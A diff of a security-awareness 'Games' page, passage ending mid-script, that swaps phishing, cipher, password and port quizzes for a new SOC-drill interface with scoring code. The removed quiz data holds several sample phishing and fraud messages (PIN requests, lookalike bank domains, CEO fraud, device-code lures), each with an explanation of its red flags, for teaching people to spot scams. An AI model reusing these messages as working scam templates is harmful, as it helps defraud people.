@@ -1,516 +1,655 @@
 ---
 layout: page
 title: Games
-icon: fas fa-gamepad
+icon: fas fa-crosshairs
 order: 3
 permalink: /games/
 ---
 
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+<div class="rg">
+  <div class="rg-bg"><span class="rg-sweep"></span></div>
+
+  <header class="rg-top">
+    <div>
+      <p class="rg-eye">// soc training range</p>
+      <h1 class="rg-title">Six drills. One console.</h1>
+      <p class="rg-sub">Every game here is a real thing analysts do on shift. Nothing is stored on a server. Your rank lives in this browser only.</p>
+    </div>
+    <div class="rg-rank">
+      <span class="rg-rank-l">analyst rank</span>
+      <b id="rg-rank">Tier 1</b>
+      <div class="rg-xpbar"><i id="rg-xpfill"></i></div>
+      <span class="rg-xp"><span id="rg-xp">0</span> XP</span>
+    </div>
+  </header>
+
+  <div id="rg-menu" class="rg-menu"></div>
+
+  <section id="rg-stage" class="rg-stage" hidden>
+    <div class="rg-stage-bar">
+      <button class="rg-back" id="rg-back">&#8592; range</button>
+      <span class="rg-stage-name" id="rg-stage-name"></span>
+      <div class="rg-hud">
+        <span>SCORE <b id="rg-score">0</b></span>
+        <span>STREAK <b id="rg-streak">0</b></span>
+        <span id="rg-prog-w">ROUND <b id="rg-prog">0</b></span>
+      </div>
+    </div>
+    <div class="rg-timer"><i id="rg-timer"></i></div>
+    <div class="rg-play" id="rg-play"></div>
+  </section>
+</div>
+
 <style>
-.gm-intro {
-  border-left: 3px solid var(--link-color);
-  padding: 12px 16px;
-  margin-bottom: 1.6rem;
-  background: var(--card-bg);
-  border-radius: 0 6px 6px 0;
+.rg{
+  --base:#06080D; --surf:#0C1119; --surf2:#111823;
+  --line:rgba(255,255,255,.09);
+  --violet:#7C5CFF; --mint:#00F0B5; --rose:#FF4D6D; --amber:#FFB020;
+  --steel:#8A97AB; --ice:#DCE4F0;
+  --d:'Chakra Petch',system-ui,sans-serif;
+  --m:'IBM Plex Mono',ui-monospace,monospace;
+  position:relative;font-family:var(--d);color:var(--ice);
+  margin:-1.5rem -1rem 0;padding:clamp(26px,4vw,44px) 20px clamp(50px,7vw,80px);
+  background:var(--base);overflow:hidden;min-height:78vh;
 }
-.gm-intro p { margin: 6px 0 0; font-size: 0.88rem; opacity: 0.75; }
+.rg *{box-sizing:border-box;margin:0;padding:0}
 
-.gm-tabs { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 1.2rem; }
-.gm-tab {
-  font-size: 0.78rem; font-weight: 600; letter-spacing: 0.4px;
-  padding: 7px 14px; border-radius: 20px; cursor: pointer;
-  border: 1px solid var(--btn-border-color, #3a3a3f);
-  background: transparent; color: inherit; opacity: 0.55;
-  transition: all 0.2s;
+/* ── background ── */
+.rg-bg{position:absolute;inset:0;pointer-events:none;overflow:hidden;
+  background-image:linear-gradient(rgba(124,92,255,.055) 1px,transparent 1px),linear-gradient(90deg,rgba(124,92,255,.055) 1px,transparent 1px);
+  background-size:44px 44px;
+  mask-image:radial-gradient(ellipse 90% 70% at 50% 30%,#000 20%,transparent 88%);
+  -webkit-mask-image:radial-gradient(ellipse 90% 70% at 50% 30%,#000 20%,transparent 88%);
 }
-.gm-tab:hover { opacity: 0.85; }
-.gm-tab.on {
-  opacity: 1; border-color: var(--link-color);
-  color: var(--link-color); background: rgba(126,178,236,0.08);
+.rg-sweep{position:absolute;top:-40%;left:-60%;width:70%;height:180%;
+  background:linear-gradient(100deg,transparent,rgba(124,92,255,.10),transparent);
+  animation:rgSweep 9s linear infinite;}
+@keyframes rgSweep{0%{transform:translateX(0)}100%{transform:translateX(260%)}}
+.rg>*:not(.rg-bg){position:relative;z-index:2}
+
+/* ── header ── */
+.rg-top{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;
+  padding-bottom:22px;border-bottom:1px solid var(--line);margin-bottom:clamp(24px,4vw,38px)}
+.rg-eye{font-family:var(--m);font-size:10px;letter-spacing:.24em;text-transform:uppercase;color:var(--violet);margin-bottom:9px!important}
+.rg-title{font-weight:700;font-size:clamp(1.5rem,4.4vw,2.3rem);line-height:1.1;color:#fff;margin-bottom:9px!important}
+.rg-sub{color:var(--steel);font-size:clamp(.84rem,1.6vw,.96rem);line-height:1.65;max-width:480px}
+.rg-rank{text-align:right;min-width:150px}
+.rg-rank-l{display:block;font-family:var(--m);font-size:9px;letter-spacing:.2em;text-transform:uppercase;color:var(--steel)}
+.rg-rank b{display:block;font-size:1.25rem;color:var(--mint);font-weight:600;margin:3px 0 8px}
+.rg-xpbar{height:4px;border-radius:3px;background:rgba(255,255,255,.08);overflow:hidden}
+.rg-xpbar i{display:block;height:100%;width:0;border-radius:3px;background:linear-gradient(90deg,var(--violet),var(--mint));transition:width .6s}
+.rg-xp{display:block;font-family:var(--m);font-size:10px;color:var(--steel);margin-top:6px}
+
+/* ── menu ── */
+.rg-menu{display:grid;grid-template-columns:repeat(auto-fit,minmax(255px,1fr));gap:12px}
+.rg-card{border:1px solid var(--line);border-radius:13px;background:var(--surf);
+  padding:19px;cursor:pointer;transition:all .22s;position:relative;overflow:hidden}
+.rg-card::after{content:'';position:absolute;inset:0;opacity:0;transition:opacity .22s;
+  background:radial-gradient(circle at 50% 0%,rgba(124,92,255,.14),transparent 62%)}
+.rg-card:hover{border-color:var(--violet);transform:translateY(-3px)}
+.rg-card:hover::after{opacity:1}
+.rg-card>*{position:relative;z-index:2}
+.rg-ci{font-size:1.5rem;line-height:1;margin-bottom:12px;display:block}
+.rg-cn{font-weight:600;font-size:1.02rem;margin-bottom:6px!important;color:#fff}
+.rg-cd{color:var(--steel);font-size:.83rem;line-height:1.58;margin-bottom:14px!important}
+.rg-cf{display:flex;justify-content:space-between;align-items:center;font-family:var(--m);font-size:9.5px;letter-spacing:.1em;text-transform:uppercase}
+.rg-diff{padding:3px 8px;border-radius:4px}
+.dd1{background:rgba(0,240,181,.13);color:var(--mint)}
+.dd2{background:rgba(255,176,32,.13);color:var(--amber)}
+.dd3{background:rgba(255,77,109,.13);color:var(--rose)}
+.rg-best{color:var(--steel)}
+
+/* ── stage ── */
+.rg-stage{border:1px solid var(--line);border-radius:13px;background:var(--surf);overflow:hidden}
+.rg-stage-bar{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:13px 16px;
+  background:rgba(124,92,255,.07);border-bottom:1px solid var(--line)}
+.rg-back{font-family:var(--m);font-size:10.5px;letter-spacing:.08em;background:transparent;
+  border:1px solid var(--line);color:var(--steel);padding:6px 12px;border-radius:6px;cursor:pointer;transition:all .18s}
+.rg-back:hover{border-color:var(--violet);color:var(--ice)}
+.rg-stage-name{font-family:var(--m);font-size:11.5px;color:var(--ice);flex:1;min-width:120px}
+.rg-hud{display:flex;gap:15px;font-family:var(--m);font-size:9.5px;letter-spacing:.12em;color:var(--steel)}
+.rg-hud b{color:var(--mint);font-size:13px;margin-left:5px}
+.rg-timer{height:3px;background:rgba(255,255,255,.06)}
+.rg-timer i{display:block;height:100%;width:100%;background:linear-gradient(90deg,var(--mint),var(--amber),var(--rose));transition:width .1s linear}
+.rg-play{padding:clamp(18px,3vw,28px)}
+
+/* ── shared play bits ── */
+.rg-q{font-size:clamp(.95rem,2vw,1.15rem);line-height:1.5;margin-bottom:18px!important;color:#fff;font-weight:500}
+.rg-panel{border:1px solid var(--line);border-radius:9px;background:var(--surf2);padding:15px;margin-bottom:16px}
+.rg-kv{display:flex;gap:12px;font-family:var(--m);font-size:11.5px;padding:5px 0;line-height:1.5}
+.rg-kv span:first-child{color:var(--steel);min-width:88px;flex-shrink:0}
+.rg-kv span:last-child{color:var(--ice);word-break:break-word}
+.rg-opts{display:flex;gap:9px;flex-wrap:wrap}
+.rg-o{font-family:var(--m);font-size:11.5px;padding:11px 18px;border-radius:8px;cursor:pointer;
+  background:transparent;border:1px solid var(--line);color:var(--ice);transition:all .18s;flex:1;min-width:120px}
+.rg-o:hover:not(:disabled){border-color:var(--violet);background:rgba(124,92,255,.1)}
+.rg-o:disabled{opacity:.35;cursor:not-allowed}
+.rg-o.ok{border-color:var(--mint);background:rgba(0,240,181,.14);color:var(--mint)}
+.rg-o.no{border-color:var(--rose);background:rgba(255,77,109,.14);color:var(--rose)}
+.rg-fb{margin-top:15px;padding:12px 15px;border-radius:8px;font-size:.85rem;line-height:1.62;display:none}
+.rg-fb.on{display:block}
+.rg-fb.good{background:rgba(0,240,181,.09);border-left:2px solid var(--mint)}
+.rg-fb.bad{background:rgba(255,77,109,.09);border-left:2px solid var(--rose)}
+.rg-fb b{color:#fff}
+.rg-next{margin-top:14px;font-family:var(--m);font-size:11px;padding:10px 22px;border-radius:7px;
+  background:var(--violet);border:none;color:#fff;cursor:pointer;font-weight:600;letter-spacing:.06em}
+.rg-next:hover{background:#8E72FF}
+
+/* log hunt */
+.rg-logs{font-family:var(--m);font-size:10.5px;line-height:1.5;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.rg-ln{padding:6px 11px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.035);color:var(--steel);transition:background .12s}
+.rg-ln:last-child{border-bottom:none}
+.rg-ln:hover{background:rgba(124,92,255,.11);color:var(--ice)}
+.rg-ln.hit{background:rgba(0,240,181,.17);color:var(--mint)}
+.rg-ln.miss{background:rgba(255,77,109,.15);color:var(--rose)}
+
+/* kill chain */
+.rg-chain{display:flex;flex-direction:column;gap:7px;margin-bottom:15px}
+.rg-step{display:flex;align-items:center;gap:11px;padding:11px 14px;border:1px solid var(--line);
+  border-radius:8px;cursor:pointer;font-size:.85rem;transition:all .18s;background:var(--surf2)}
+.rg-step:hover:not(.used){border-color:var(--violet)}
+.rg-step.used{opacity:.28;cursor:not-allowed}
+.rg-step-n{font-family:var(--m);font-size:10px;color:var(--violet);min-width:20px}
+.rg-slots{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:15px;min-height:34px}
+.rg-slot{font-family:var(--m);font-size:10px;padding:6px 11px;border-radius:20px;
+  background:rgba(124,92,255,.14);color:var(--ice);border:1px solid rgba(124,92,255,.35)}
+
+/* result */
+.rg-res{text-align:center;padding:clamp(24px,5vw,44px) 10px}
+.rg-res-n{font-family:var(--m);font-size:clamp(2.2rem,8vw,3.4rem);font-weight:600;color:var(--mint);line-height:1}
+.rg-res-t{font-size:1.1rem;font-weight:600;color:#fff;margin:14px 0 8px!important}
+.rg-res-s{color:var(--steel);font-size:.88rem;line-height:1.65;max-width:400px;margin:0 auto 22px!important}
+.rg-res-b{display:flex;gap:9px;justify-content:center;flex-wrap:wrap}
+
+@media(max-width:640px){
+  .rg-top{align-items:flex-start}
+  .rg-rank{text-align:left}
+  .rg-hud{width:100%;justify-content:space-between;gap:8px}
+  .rg-o{min-width:0;flex:1 1 100%}
 }
-
-.gm-panel { display: none; }
-.gm-panel.on { display: block; }
-
-.gm-card {
-  background: var(--card-bg);
-  border: 1px solid var(--btn-border-color, #3a3a3f);
-  border-radius: 12px;
-  padding: 20px;
-  margin-bottom: 1rem;
-}
-.gm-head { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 14px; }
-.gm-title { font-size: 1rem; font-weight: 700; margin: 0; }
-.gm-sub { font-size: 0.8rem; opacity: 0.55; margin: 3px 0 0; }
-.gm-score { font-size: 0.78rem; font-family: monospace; opacity: 0.7; white-space: nowrap; }
-.gm-score b { color: var(--link-color); font-size: 0.95rem; }
-
-.gm-btn {
-  font-size: 0.82rem; font-weight: 600; padding: 9px 18px;
-  border-radius: 7px; cursor: pointer; transition: all 0.18s;
-  border: 1px solid var(--link-color); background: transparent; color: var(--link-color);
-}
-.gm-btn:hover { background: var(--link-color); color: #fff; }
-.gm-btn:disabled { opacity: 0.35; cursor: not-allowed; }
-.gm-btn.danger { border-color: #ff5f56; color: #ff5f56; }
-.gm-btn.danger:hover { background: #ff5f56; color: #fff; }
-.gm-btn.safe { border-color: #27c93f; color: #27c93f; }
-.gm-btn.safe:hover { background: #27c93f; color: #fff; }
-.gm-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 14px; }
-
-.gm-msgbox {
-  background: rgba(128,128,128,0.07);
-  border: 1px solid var(--btn-border-color, #3a3a3f);
-  border-radius: 8px; padding: 14px 16px; min-height: 130px;
-}
-.gm-msg-from { font-size: 0.75rem; opacity: 0.55; margin-bottom: 3px; font-family: monospace; }
-.gm-msg-subj { font-size: 0.92rem; font-weight: 700; margin-bottom: 8px; }
-.gm-msg-body { font-size: 0.87rem; line-height: 1.55; white-space: pre-wrap; }
-
-.gm-feedback { margin-top: 12px; padding: 11px 14px; border-radius: 7px; font-size: 0.83rem; line-height: 1.5; display: none; }
-.gm-feedback.right { display: block; background: rgba(39,201,63,0.1); border-left: 3px solid #27c93f; }
-.gm-feedback.wrong { display: block; background: rgba(255,95,86,0.1); border-left: 3px solid #ff5f56; }
-
-.gm-code {
-  font-family: monospace; font-size: 0.95rem; letter-spacing: 1px;
-  background: rgba(128,128,128,0.1); border-radius: 7px;
-  padding: 14px 16px; word-break: break-all; text-align: center;
-  border: 1px dashed var(--btn-border-color, #3a3a3f);
-}
-.gm-badge {
-  display: inline-block; font-size: 0.68rem; font-weight: 700;
-  letter-spacing: 1px; padding: 2px 9px; border-radius: 10px;
-  background: rgba(126,178,236,0.15); color: var(--link-color);
-  margin-bottom: 8px;
-}
-.gm-input {
-  width: 100%; padding: 10px 13px; font-size: 0.9rem; font-family: monospace;
-  border-radius: 7px; border: 1px solid var(--btn-border-color, #3a3a3f);
-  background: rgba(128,128,128,0.06); color: inherit; outline: none;
-}
-.gm-input:focus { border-color: var(--link-color); }
-
-.gm-meter { height: 9px; border-radius: 5px; background: rgba(128,128,128,0.18); overflow: hidden; margin: 12px 0 8px; }
-.gm-meter-fill { height: 100%; width: 0%; transition: width 0.3s, background 0.3s; border-radius: 5px; }
-.gm-checks { list-style: none; padding: 0; margin: 12px 0 0; font-size: 0.82rem; }
-.gm-checks li { padding: 3px 0; opacity: 0.45; transition: opacity 0.2s; }
-.gm-checks li.hit { opacity: 1; color: #27c93f; }
-.gm-crack { font-family: monospace; font-size: 0.85rem; margin-top: 10px; opacity: 0.8; }
-
-.gm-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
-.gm-tile {
-  aspect-ratio: 1; border-radius: 8px; cursor: pointer;
-  display: flex; align-items: center; justify-content: center;
-  font-size: 0.7rem; font-weight: 700; text-align: center; padding: 4px;
-  border: 1px solid var(--btn-border-color, #3a3a3f);
-  background: rgba(128,128,128,0.08);
-  transition: all 0.2s; user-select: none; line-height: 1.15;
-}
-.gm-tile .face { opacity: 0; transition: opacity 0.15s; }
-.gm-tile.up { background: rgba(126,178,236,0.16); border-color: var(--link-color); }
-.gm-tile.up .face { opacity: 1; }
-.gm-tile.done { background: rgba(39,201,63,0.14); border-color: #27c93f; cursor: default; }
-.gm-tile.done .face { opacity: 1; }
-.gm-tile:not(.up):not(.done):hover { background: rgba(128,128,128,0.16); }
-.gm-tile .q { font-size: 1.3rem; opacity: 0.25; }
-.gm-tile.up .q, .gm-tile.done .q { display: none; }
-
-@media(max-width:600px){ .gm-grid { grid-template-columns: repeat(4, 1fr); } .gm-tile { font-size: 0.58rem; } }
+@media(prefers-reduced-motion:reduce){.rg-sweep{animation:none}}
 </style>
-
-<div class="gm-intro">
-  <strong>Four short games that teach real security concepts.</strong>
-  <p>No sign-up, nothing stored on a server, all running in your browser. Built these because security ideas stick better when you have to actually make the call yourself.</p>
-</div>
-
-<div class="gm-tabs">
-  <button class="gm-tab on" data-g="0">🎣 Phish or Legit</button>
-  <button class="gm-tab" data-g="1">🔐 Cipher Cracker</button>
-  <button class="gm-tab" data-g="2">🔑 Password Lab</button>
-  <button class="gm-tab" data-g="3">🧠 Port Match</button>
-</div>
-
-<!-- ══════════ GAME 1: PHISH OR LEGIT ══════════ -->
-<div class="gm-panel on" id="p0">
-<div class="gm-card">
-  <div class="gm-head">
-    <div>
-      <p class="gm-title">Phish or Legit</p>
-      <p class="gm-sub">Real-world message patterns. Call it before the money moves.</p>
-    </div>
-    <div class="gm-score">Round <b id="f-round">1</b>/10 &nbsp;·&nbsp; Score <b id="f-score">0</b></div>
-  </div>
-  <div class="gm-msgbox">
-    <div class="gm-badge" id="f-chan">SMS</div>
-    <div class="gm-msg-from" id="f-from"></div>
-    <div class="gm-msg-subj" id="f-subj"></div>
-    <div class="gm-msg-body" id="f-body"></div>
-  </div>
-  <div class="gm-feedback" id="f-fb"></div>
-  <div class="gm-row" id="f-controls">
-    <button class="gm-btn danger" onclick="fAnswer(true)">🎣 Phishing</button>
-    <button class="gm-btn safe" onclick="fAnswer(false)">✅ Legitimate</button>
-  </div>
-  <div class="gm-row" id="f-next" style="display:none">
-    <button class="gm-btn" onclick="fNext()">Next →</button>
-  </div>
-</div>
-</div>
-
-<!-- ══════════ GAME 2: CIPHER CRACKER ══════════ -->
-<div class="gm-panel" id="p1">
-<div class="gm-card">
-  <div class="gm-head">
-    <div>
-      <p class="gm-title">Cipher Cracker</p>
-      <p class="gm-sub">Decode the intercepted payload. Encodings analysts see every week.</p>
-    </div>
-    <div class="gm-score">Level <b id="c-lvl">1</b>/8 &nbsp;·&nbsp; Score <b id="c-score">0</b></div>
-  </div>
-  <div class="gm-badge" id="c-type">BASE64</div>
-  <div class="gm-code" id="c-code"></div>
-  <div style="margin-top:14px">
-    <input class="gm-input" id="c-in" placeholder="type the decoded text..." autocomplete="off" spellcheck="false">
-  </div>
-  <div class="gm-feedback" id="c-fb"></div>
-  <div class="gm-row">
-    <button class="gm-btn" onclick="cCheck()">Submit</button>
-    <button class="gm-btn" onclick="cHint()">Hint (-20)</button>
-  </div>
-</div>
-</div>
-
-<!-- ══════════ GAME 3: PASSWORD LAB ══════════ -->
-<div class="gm-panel" id="p2">
-<div class="gm-card">
-  <div class="gm-head">
-    <div>
-      <p class="gm-title">Password Lab</p>
-      <p class="gm-sub">Watch entropy and crack time change as you type. Nothing leaves your browser.</p>
-    </div>
-    <div class="gm-score">Entropy <b id="w-bits">0</b> bits</div>
-  </div>
-  <input class="gm-input" id="w-in" placeholder="start typing a password..." autocomplete="off" spellcheck="false">
-  <div class="gm-meter"><div class="gm-meter-fill" id="w-bar"></div></div>
-  <div style="font-size:0.85rem;font-weight:700" id="w-label">Type something to begin</div>
-  <div class="gm-crack" id="w-crack"></div>
-  <ul class="gm-checks">
-    <li id="w-c1">12 or more characters</li>
-    <li id="w-c2">Mixed upper and lower case</li>
-    <li id="w-c3">Contains numbers</li>
-    <li id="w-c4">Contains symbols</li>
-    <li id="w-c5">Not a common or predictable pattern</li>
-  </ul>
-  <div style="margin-top:16px;font-size:0.8rem;opacity:0.6;line-height:1.55">
-    Crack time assumes an offline attack at 100 billion guesses per second against a fast hash. A slow hash like bcrypt or Argon2 makes this dramatically harder, which is exactly why the choice of hashing algorithm matters as much as the password itself.
-  </div>
-</div>
-</div>
-
-<!-- ══════════ GAME 4: PORT MATCH ══════════ -->
-<div class="gm-panel" id="p3">
-<div class="gm-card">
-  <div class="gm-head">
-    <div>
-      <p class="gm-title">Port Match</p>
-      <p class="gm-sub">Match each port to its service. Memory game for the ports you meet on every scan.</p>
-    </div>
-    <div class="gm-score">Moves <b id="m-moves">0</b> &nbsp;·&nbsp; Found <b id="m-found">0</b>/8</div>
-  </div>
-  <div class="gm-grid" id="m-grid"></div>
-  <div class="gm-feedback" id="m-fb"></div>
-  <div class="gm-row">
-    <button class="gm-btn" onclick="mInit()">New Game</button>
-  </div>
-</div>
-</div>
 
 <script>
 (function(){
+var R=document.querySelector('.rg'); if(!R) return;
 
-/* ─── TABS ─────────────────────────────── */
-document.querySelectorAll('.gm-tab').forEach(function(t){
-  t.addEventListener('click', function(){
-    document.querySelectorAll('.gm-tab').forEach(function(x){x.classList.remove('on');});
-    document.querySelectorAll('.gm-panel').forEach(function(x){x.classList.remove('on');});
-    t.classList.add('on');
-    document.getElementById('p'+t.dataset.g).classList.add('on');
-  });
+/* ══════ STATE ══════ */
+var S={xp:0,best:{}};
+try{var raw=localStorage.getItem('rg_state'); if(raw) S=JSON.parse(raw)}catch(e){}
+function save(){try{localStorage.setItem('rg_state',JSON.stringify(S))}catch(e){}}
+
+var RANKS=[[0,'Tier 1'],[400,'Tier 2'],[1000,'Tier 3'],[1900,'Senior Analyst'],[3000,'Threat Hunter'],[4500,'Detection Lead']];
+function rank(){var r=RANKS[0];for(var i=0;i<RANKS.length;i++){if(S.xp>=RANKS[i][0])r=RANKS[i]}return r}
+function nextAt(){for(var i=0;i<RANKS.length;i++){if(S.xp<RANKS[i][0])return RANKS[i][0]}return RANKS[RANKS.length-1][0]}
+function paintRank(){
+  var r=rank(),n=nextAt(),prev=r[0];
+  document.getElementById('rg-rank').textContent=r[1];
+  document.getElementById('rg-xp').textContent=S.xp;
+  var pct = n>prev ? Math.min(100,((S.xp-prev)/(n-prev))*100) : 100;
+  document.getElementById('rg-xpfill').style.width=pct+'%';
+}
+
+/* ══════ GAMES ══════ */
+var GAMES=[
+ {id:'triage', i:'\u{1F6A8}', n:'Triage Queue',    d:'Alerts land one at a time. Call each one benign, investigate, or escalate. The clock does not wait.', diff:1, dl:'core skill'},
+ {id:'hunt',   i:'\u{1F50E}', n:'Log Hunt',        d:'One line in the wall is malicious. Find it before the timer empties. Gets faster every round.',      diff:2, dl:'pattern'},
+ {id:'chain',  i:'\u{1F517}', n:'Kill Chain',      d:'Seven events from one intrusion, shuffled. Put them back in the order they actually happened.',       diff:2, dl:'sequencing'},
+ {id:'ioc',    i:'\u26A1',    n:'IOC or Noise',    d:'Twenty strings, four seconds each. Indicator of compromise, or perfectly normal? Go with your gut.',  diff:1, dl:'rapid fire'},
+ {id:'decode', i:'\u{1F511}', n:'Payload Decoder', d:'Obfuscated payloads pulled from traffic. Decode them under time pressure.',                          diff:3, dl:'technical'},
+ {id:'cmd',    i:'\u{1F6E1}', n:'Incident Command',d:'Ransomware is detonating across the estate. Seven decisions. Every one changes the outcome.',         diff:3, dl:'judgement'}
+];
+
+var menu=document.getElementById('rg-menu'),
+    stage=document.getElementById('rg-stage'),
+    play=document.getElementById('rg-play'),
+    tbar=document.getElementById('rg-timer');
+
+function paintMenu(){
+  menu.innerHTML=GAMES.map(function(g){
+    var b=S.best[g.id]||0;
+    return '<div class="rg-card" data-g="'+g.id+'">'+
+      '<span class="rg-ci">'+g.i+'</span>'+
+      '<p class="rg-cn">'+g.n+'</p>'+
+      '<p class="rg-cd">'+g.d+'</p>'+
+      '<div class="rg-cf"><span class="rg-diff dd'+g.diff+'">'+g.dl+'</span>'+
+      '<span class="rg-best">'+(b?('best '+b):'not played')+'</span></div></div>';
+  }).join('');
+}
+paintMenu(); paintRank();
+
+menu.addEventListener('click',function(e){
+  var c=e.target.closest('.rg-card'); if(c) open(c.dataset.g);
+});
+document.getElementById('rg-back').addEventListener('click',function(){
+  stop(); stage.hidden=true; menu.hidden=false; paintMenu(); paintRank();
 });
 
-/* ─── GAME 1: PHISH OR LEGIT ───────────── */
-var FEED = [
-  { chan:"SMS", from:"MPESA", subj:"", phish:false,
-    body:"WK42XY9L1M Confirmed. Ksh2,500.00 sent to JOHN OMONDI 0712345678 on 8/8/26 at 3:14 PM. New M-PESA balance is Ksh8,420.00. Transaction cost, Ksh29.00.",
-    why:"Legitimate. Real M-PESA confirmations come from the MPESA sender ID, contain a transaction code, and never contain a link or ask you to do anything." },
-  { chan:"SMS", from:"+254 7XX XXX XXX", subj:"", phish:true,
-    body:"Dear customer, your M-PESA account has been suspended due to unusual activity. To reactivate, reply with your ID number and M-PESA PIN within 2 hours or your account will be closed permanently.",
-    why:"Phishing. Sent from a personal number, not a sender ID. No provider will ever ask for your PIN, and the deadline exists purely to stop you thinking." },
-  { chan:"EMAIL", from:"security-alerts@equity-bank-ke.com", subj:"Unusual Sign-In Attempt Detected", phish:true,
-    body:"We detected a sign-in from a new device in Lagos, Nigeria.\n\nIf this was not you, verify your identity immediately:\nhttps://equity-bank-ke.com/verify-account\n\nFailure to verify within 24 hours will result in account suspension.",
-    why:"Phishing. The domain is a lookalike, not the bank's real domain. Legitimate alerts tell you to log in through the app or the official site, never through a link with a countdown attached." },
-  { chan:"EMAIL", from:"noreply@github.com", subj:"[GitHub] A new SSH key was added to your account", phish:false,
-    body:"A new SSH key was added to your account.\n\nKey fingerprint: SHA256:x9Kd...\n\nIf you did not add this key, please review your account security settings at github.com/settings/keys.",
-    why:"Legitimate. Correct sender domain, factual notification, and it directs you to navigate to the settings page yourself rather than clicking a supplied link." },
-  { chan:"SMS", from:"MPESA", subj:"", phish:true,
-    body:"Confirmed. You have received Ksh15,000.00 from SAMUEL KIPTOO. New balance Ksh21,300.00.\n\n[2 min later, phone call] Hello, I sent money to the wrong number by mistake. Please reverse it, I have children to feed.",
-    why:"Phishing, the reversal scam. The confirmation was spoofed and no money arrived. If you send Ksh15,000 back, you are sending your own funds. Always check your actual balance in the app before acting." },
-  { chan:"EMAIL", from:"a.mwangi@yourcompany.co.ke", subj:"Urgent - Confidential Payment", phish:true,
-    body:"I am in a board meeting and cannot take calls.\n\nI need you to process a payment of KES 1,450,000 to a new supplier today. Details attached. Please keep this confidential until the deal is announced.\n\nSent from my iPhone",
-    why:"Phishing, CEO fraud. Urgency plus confidentiality plus a new beneficiary plus an excuse for why you cannot verify. That combination is the signature of business email compromise." },
-  { chan:"EMAIL", from:"accounts@supplierltd.co.ke", subj:"Updated Banking Details - Invoice INV-8841", phish:true,
-    body:"Dear Accounts Team,\n\nPlease note we have changed our banking provider. Kindly update your records and remit payment for INV-8841 to:\n\nBank: [New Bank]\nAccount: 01XXXXXXXXX\n\nApologies for any inconvenience.",
-    why:"Phishing, vendor invoice fraud. The invoice may be real and the relationship genuine, but bank detail changes must always be verified by calling a number from your own vendor records, never a number in the email." },
-  { chan:"SMS", from:"SAFARICOM", subj:"", phish:false,
-    body:"Your Safaricom line 07XX XXX XXX has 1.2GB data remaining, expiring on 15/08/26. Dial *544# to top up.",
-    why:"Legitimate. Registered sender ID, no link, no request for information, and it points you to a USSD code you dial yourself." },
-  { chan:"EMAIL", from:"no-reply@microsoft-verify.net", subj:"Action Required: Verify your device", phish:true,
-    body:"Your organisation requires device verification.\n\nGo to microsoft.com/devicelogin and enter code: XKCD-9931\n\nThis code expires in 15 minutes.",
-    why:"Phishing, OAuth device code attack. The destination is the real Microsoft page and you will complete a real MFA challenge, but the token gets issued to the attacker who generated that code. Never enter a code you did not personally request." },
-  { chan:"SMS", from:"KRA", subj:"", phish:true,
-    body:"KRA NOTICE: You have an outstanding tax liability of KES 47,300. Pay via Paybill 8XXXXX Acc: your PIN within 48hrs to avoid penalties and legal action. Ignore if already paid.",
-    why:"Phishing. KRA communicates tax obligations through iTax and formal notices, not SMS demands with a paybill number and a 48 hour threat. Always log in to iTax directly to check." }
-];
-
-var fi=0, fs=0, fAnswered=false;
-
-function fRender(){
-  var m=FEED[fi];
-  document.getElementById('f-round').textContent=fi+1;
-  document.getElementById('f-score').textContent=fs;
-  document.getElementById('f-chan').textContent=m.chan;
-  document.getElementById('f-from').textContent="From: "+m.from;
-  document.getElementById('f-subj').textContent=m.subj||"";
-  document.getElementById('f-subj').style.display=m.subj?"block":"none";
-  document.getElementById('f-body').textContent=m.body;
-  document.getElementById('f-fb').className='gm-feedback';
-  document.getElementById('f-controls').style.display='flex';
-  document.getElementById('f-next').style.display='none';
-  fAnswered=false;
+/* ══════ ENGINE ══════ */
+var G={id:null,score:0,streak:0,round:0,total:0,timer:null,tick:null};
+function hud(){
+  document.getElementById('rg-score').textContent=G.score;
+  document.getElementById('rg-streak').textContent=G.streak>1?('x'+G.streak):G.streak;
+  document.getElementById('rg-prog').textContent=G.round+'/'+G.total;
 }
-
-window.fAnswer=function(saidPhish){
-  if(fAnswered) return;
-  fAnswered=true;
-  var m=FEED[fi], correct=(saidPhish===m.phish);
-  if(correct) fs+=10;
-  var fb=document.getElementById('f-fb');
-  fb.className='gm-feedback '+(correct?'right':'wrong');
-  fb.innerHTML='<strong>'+(correct?'Correct.':'Not quite.')+'</strong> '+m.why;
-  document.getElementById('f-score').textContent=fs;
-  document.getElementById('f-controls').style.display='none';
-  document.getElementById('f-next').style.display='flex';
-};
-
-window.fNext=function(){
-  fi++;
-  if(fi>=FEED.length){
-    var pct=Math.round((fs/(FEED.length*10))*100);
-    var verdict = pct>=90?"Excellent. You would catch almost everything.":
-                  pct>=70?"Solid. A few would still get through.":
-                  pct>=50?"Mixed. Worth revisiting the ones you missed.":
-                          "Worth a second run. These patterns are the ones costing people real money.";
-    document.querySelector('#p0 .gm-msgbox').innerHTML=
-      '<div style="text-align:center;padding:26px 10px">'+
-      '<div style="font-size:2rem;font-weight:800;color:var(--link-color)">'+fs+' / '+(FEED.length*10)+'</div>'+
-      '<div style="margin-top:8px;font-size:0.88rem;opacity:0.75">'+verdict+'</div></div>';
-    document.getElementById('f-fb').className='gm-feedback';
-    document.getElementById('f-next').innerHTML='<button class="gm-btn" onclick="fRestart()">Play Again</button>';
-    return;
-  }
-  fRender();
-};
-
-window.fRestart=function(){
-  fi=0; fs=0;
-  document.querySelector('#p0 .gm-msgbox').innerHTML=
-    '<div class="gm-badge" id="f-chan">SMS</div>'+
-    '<div class="gm-msg-from" id="f-from"></div>'+
-    '<div class="gm-msg-subj" id="f-subj"></div>'+
-    '<div class="gm-msg-body" id="f-body"></div>';
-  document.getElementById('f-next').innerHTML='<button class="gm-btn" onclick="fNext()">Next →</button>';
-  fRender();
-};
-
-fRender();
-
-/* ─── GAME 2: CIPHER CRACKER ───────────── */
-var CIPH=[
